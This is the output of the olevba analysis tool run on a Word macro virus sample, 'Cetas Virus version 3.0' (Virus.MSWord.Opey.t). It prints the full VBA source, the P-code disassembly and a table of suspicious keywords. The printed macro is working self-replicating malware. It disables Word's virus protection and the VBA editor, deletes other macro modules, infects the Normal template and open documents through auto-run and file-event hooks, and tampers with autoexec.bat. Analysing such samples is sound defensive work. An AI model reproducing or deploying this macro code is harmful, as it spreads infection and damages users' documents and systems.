olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.t
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.t - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xHeCs3.bas 
in file: Virus.MSWord.Opey.t - OLE stream: 'Macros/VBA/xHeCs3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub vxConTrol()
'
' Cetas Virus version 3.0 by xHeCs
' ATTENTION LAMERS that's you !!!.
'     You can learn a lot from this virus, But Please respect
' What is not yours.
'
On Error Resume Next
Application.UserName = "PAcMAn"
Application.UserAddress = "PAcMAn ZonE"
Application.UserInitials = "xHeCs"
With Dialogs(wdDialogFileSummaryInfo)
        .Author = "xHeCs"
        .Comments = "Life is like a box of chocolate you'll never know what your gonna get :)"
        .Execute
End With
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
End With
With ActiveDocument
   .ReadOnlyRecommended = False
End With
On Error Resume Next
CommandBars("Visual Basic").Visible = False
CommandBars("Visual Basic").Enabled = False
CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
CommandBars("Visual Basic").Protection = msoBarNoCustomize
CommandBars("Tools").Controls("Macro").Delete
CommandBars("Tools").Controls("Customize...").Delete
CustomizationContext = NormalTemplate
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable

NTInfected = False
For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(I).Name
                If clan = "xHeCs3" Then NTInfected = True
                If (clan <> "xHeCs3") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
Next I
    For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "xHeCs3" Then ODInfected = True
                    If (clan <> "xHeCs3") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
     Next J
     If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="xHeCs3", Object:=wdOrganizerObjectProjectItems
     opendoc.SaveAs FileName:=opendoc.FullName
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="xHeCs3", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If


Application.VBE.ActiveVBProject.VBComponents("xHeCs3").Export "c:\WinCTL.sys"

For I = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents(I).Name = "xHeCs3" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents(I).Name = "xHeCs3" Then ActivInstall = True
Next I
If ActivInstall = True And NormInstall = False Then Set Target = NormalTemplate.VBProject _
Else: If ActivInstall = False And NormInstall = True Then Set Target = ActiveDocument.VBProject
Target.VBComponents.Import ("c:\WinCtl.sys")
End Sub
Sub FileSave()
    On Error Resume Next
    Call vxConTrol
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call vxConTrol
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call vxConTrol
End Sub
Sub FileExit()
    On Error Resume Next
    Call vxConTrol
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    newfile$ = 1
    Call vxConTrol
End Sub
Sub EditFind()
    On Error Resume Next
    Dialogs(wdDialogEditFind).Show
    Call vxConTrol
End Sub
Sub AutoExec()
    On Error Resume Next
    Call vxConTrol
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call vxConTrol
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call vxConTrol
End Sub
Function Delay()
    For I = 0 To 10000000
    Next I
End Function
Sub AutoClose()
    On Error Resume Next
    Call vxConTrol
    If (Minute(Time) = 35) Then
        If (Second(Time) Mod 2) = 0 Then
          DirTest = DIR("C:\WinSys.Vxd")
          If DirTest <> "" Then
             Filecopy "C:\Autoexec.bat", "C:\WinSys.Vxd"
             autoexecfile$ = "c:\autoexec.bat"
             hFile = FreeFile
             Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, "If Exist Vx.Dat Goto End"
                        Print #hFile, "echo Cetas virus Version 3.0 "
                        Print #hFile, "echo (C)Copyright 1999-2000 xHeCs"
                        Print #hFile, "pause"
                        Print #hFile, "copy/y WinSys.Vxd Autoexec.bat >NULL"
                        Print #hFile, "echo Cetas Virus version 3.0 by xHeCS >Vx.Dat"
                        Print #hFile, ":End"
             Close hFile
          End If
    End If
    End If
NoBox:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.t
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1128 bytes
' Macros/VBA/xHeCs3 - 8796 bytes
' Line #0:
' 	FuncDefn (Sub vxConTrol())
' Line #1:
' 	QuoteRem 0x0000 0x0000 ""
' Line #2:
' 	QuoteRem 0x0000 0x0021 " Cetas Virus version 3.0 by xHeCs"
' Line #3:
' 	QuoteRem 0x0000 0x0021 " ATTENTION LAMERS that's you !!!."
' Line #4:
' 	QuoteRem 0x0000 0x003C "     You can learn a lot from this virus, But Please respect"
' Line #5:
' 	QuoteRem 0x0000 0x0013 " What is not yours."
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitStr 0x0006 "PAcMAn"
' 	Ld Application 
' 	MemSt UserName 
' Line #9:
' 	LitStr 0x000B "PAcMAn ZonE"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #10:
' 	LitStr 0x0005 "xHeCs"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #11:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #12:
' 	LitStr 0x0005 "xHeCs"
' 	MemStWith Author 
' Line #13:
' 	LitStr 0x0048 "Life is like a box of chocolate you'll never know what your gonna get :)"
' 	MemStWith Comments 
' Line #14:
' 	ArgsMemCallWith Execute 0x0000 
' Line #15:
' 	EndWith 
' Line #16:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #17:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #18:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #19:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #20:
' 	EndWith 
' Line #21:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #23:
' 	EndWith 
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #26:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #27:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #28:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #29:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #30:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #31:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #32:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #33:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #34:
' Line #35:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #36:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #37:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #38:
' 	Ld clan 
' 	LitStr 0x0006 "xHeCs3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #39:
' 	Ld clan 
' 	LitStr 0x0006 "xHeCs3"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #40:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #42:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #43:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #44:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #45:
' 	Ld J 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #46:
' 	Ld clan 
' 	LitStr 0x0006 "xHeCs3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #47:
' 	Ld clan 
' 	LitStr 0x0006 "xHeCs3"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #48:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "xHeCs3"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #51:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndWith 
' Line #54:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #55:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "xHeCs3"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #57:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #58:
' 	EndIfBlock 
' Line #59:
' Line #60:
' Line #61:
' 	LitStr 0x000D "c:\WinCTL.sys"
' 	LitStr 0x0006 "xHeCs3"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #62:
' Line #63:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #64:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "xHeCs3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #65:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #66:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #67:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "xHeCs3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #68:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	LineCont 0x0004 0F 00 00 00
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Target 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Target 
' 	EndIf 
' 	EndIf 
' Line #70:
' 	LitStr 0x000D "c:\WinCtl.sys"
' 	Paren 
' 	Ld Target 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub FileSave())
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #75:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub FileClose())
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #80:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #81:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #82:
' 	EndSub 
' Line #83:
' 	FuncDefn (Sub AutoOpen())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #86:
' 	EndSub 
' Line #87:
' 	FuncDefn (Sub FileExit())
' Line #88:
' 	OnError (Resume Next) 
' Line #89:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #90:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #91:
' 	Ld Application 
' 	ArgsMemCall quit 0x0000 
' Line #92:
' 	EndSub 
' Line #93:
' 	FuncDefn (Sub FileNew())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #96:
' 	LitDI2 0x0001 
' 	St newfile$ 
' Line #97:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #98:
' 	EndSub 
' Line #99:
' 	FuncDefn (Sub EditFind())
' Line #100:
' 	OnError (Resume Next) 
' Line #101:
' 	Ld wdDialogEditFind 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #102:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #103:
' 	EndSub 
' Line #104:
' 	FuncDefn (Sub AutoExec())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub FileSaveAs())
' Line #109:
' 	OnError (Resume Next) 
' Line #110:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #111:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub FilePageSetup())
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #116:
' 	Ld wdDialogFilePageSetup 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #117:
' 	EndSub 
' Line #118:
' 	FuncDefn (Sub FilePrint())
' Line #119:
' 	OnError (Resume Next) 
' Line #120:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #121:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Sub FileOpen())
' Line #124:
' 	OnError (Resume Next) 
' Line #125:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #126:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Function Delay())
' Line #129:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI4 0x9680 0x0098 
' 	For 
' Line #130:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #131:
' 	EndFunc 
' Line #132:
' 	FuncDefn (Sub AutoClose())
' Line #133:
' 	OnError (Resume Next) 
' Line #134:
' 	ArgsCall (Call) vxConTrol 0x0000 
' Line #135:
' 	Ld Time 
' 	ArgsLd Minute 0x0001 
' 	LitDI2 0x0023 
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #136:
' 	Ld Time 
' 	ArgsLd Second 0x0001 
' 	LitDI2 0x0002 
' 	Mod 
' 	Paren 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #137:
' 	LitStr 0x000D "C:\WinSys.Vxd"
' 	ArgsLd Dir 0x0001 
' 	St DirTest 
' Line #138:
' 	Ld DirTest 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #139:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitStr 0x000D "C:\WinSys.Vxd"
' 	ArgsCall Filecopy 0x0002 
' Line #140:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #141:
' 	Ld Friend 
' 	St hFile 
' Line #142:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #143:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #144:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "If Exist Vx.Dat Goto End"
' 	PrintItemNL 
' Line #145:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "echo Cetas virus Version 3.0 "
' 	PrintItemNL 
' Line #146:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "echo (C)Copyright 1999-2000 xHeCs"
' 	PrintItemNL 
' Line #147:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #148:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "copy/y WinSys.Vxd Autoexec.bat >NULL"
' 	PrintItemNL 
' Line #149:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo Cetas Virus version 3.0 by xHeCS >Vx.Dat"
' 	PrintItemNL 
' Line #150:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 ":End"
' 	PrintItemNL 
' Line #151:
' 	Ld hFile 
' 	Close 0x0001 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	Label NoBox 
' Line #156:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Filecopy            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

